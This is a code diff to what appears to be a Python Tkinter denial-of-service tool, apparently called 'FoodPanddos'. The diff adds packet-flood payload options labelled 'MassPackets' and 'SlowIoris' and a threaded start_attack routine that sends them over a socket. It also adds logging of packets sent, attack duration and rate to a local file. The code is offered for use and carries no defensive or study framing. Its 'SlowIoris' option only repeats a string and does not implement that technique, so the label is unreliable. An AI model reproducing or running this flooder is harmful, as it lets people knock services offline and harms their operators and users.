@@ -81,18 +81,20 @@ warning_counter.pack()
 
 login_frame.pack(pady=10)
 
+# Payload statements
 def generate_payload(payload_type):
-    if payload_type == "Random":
+    if payload_type == "MassPackets":
         payload = generate_random_payload()
-    else:
+    if payload_type == "SlowIoris":
         payload = generate_severe_payload(payload_type)
     return payload
 
-
+# MassPackets Payload
 def generate_random_payload():
     payload = bytearray(random.getrandbits(8) for _ in range(1024))
     return payload
 
+# SlowIoris Payload
 def generate_severe_payload(payload_type):
     payload = bytearray(payload_type, "utf-8") * 1024
     return payload
@@ -142,7 +144,7 @@ def start_attack():
             except socket.error as e:
                 print("Error sending packet:", str(e))
                 break
-
+        
         # Close the attack socket
         attack_socket.close()
 
@@ -158,10 +160,26 @@ def start_attack():
         attack_duration_label.config(text="Attack Duration: " + str(attack_duration) + " seconds")
         packets_per_second_label.config(text="Packets per Second: " + str(packets_per_second))
 
+        # Update log file
+        update_log_file(total_packets_sent, attack_duration, packets_per_second)
+
     # Create and start a thread for the attack
     attack_thread = threading.Thread(target=attack)
     attack_thread.start()
 
+def update_log_file(total_packets_sent, attack_duration, packets_per_second):
+    log_filename = "FoodPanddos Logs.txt"
+    log_dir = os.path.dirname(os.path.abspath(__file__))
+    log_path = os.path.join(log_dir, log_filename)
+
+    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"Date/Time: {current_time}\n"
+    log_entry += f"Packets Sent: {total_packets_sent}\n"
+    log_entry += f"Attack Duration: {attack_duration} seconds\n"
+    log_entry += f"Packets per Second: {packets_per_second}\n\n"
+
+    with open(log_path, "a") as log_file:
+        log_file.write(log_entry)
 
 # Creating a frame for the attack controls
 controls_frame = tk.Frame(window)
@@ -187,7 +205,7 @@ duration_entry.pack(pady=5)
 # Creating a dropdown for payload type selection
 payload_label = tk.Label(controls_frame, text="Payload Type:", font=("Arial", 12))
 payload_label.pack()
-payload_options = ["Random", "Custom"]
+payload_options = ["MassPackets", "SlowIoris"]
 payload_dropdown = tk.StringVar(controls_frame)
 payload_dropdown.set(payload_options[0])
 payload_menu = tk.OptionMenu(controls_frame, payload_dropdown, *payload_options)
